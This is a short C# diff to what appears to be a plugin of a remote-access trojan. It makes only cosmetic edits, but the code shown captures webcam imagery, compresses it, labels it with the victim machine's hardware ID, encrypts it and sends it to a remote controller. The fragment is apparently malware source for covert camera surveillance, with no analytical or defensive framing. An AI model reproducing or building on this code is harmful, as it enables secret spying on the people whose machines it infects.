@@ -74,7 +74,7 @@ namespace Plugin
                         byte[] compressed = Shared.Compressor.QuickLZ.Compress(Camstream.ToArray(), 1);
                         Data D = new Data();
                         D.HWID = HWID;
-                        D.Type = Shared.PacketTypes.PacketType.CAPTURE_CAMERA;
+                        D.Type = PacketType.CAPTURE_CAMERA;
                         D.DataReturn = new object[] { compressed };
                         D.IP_Origin = BaseIP;
                         SendData(C.S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key)));
@@ -86,8 +86,7 @@ namespace Plugin
                     new Thread(() =>
                     {
                         try
-                        {
-                     
+                        {           
                             Stop(H, HWID, key, BaseIP);
                         }
                         catch { }
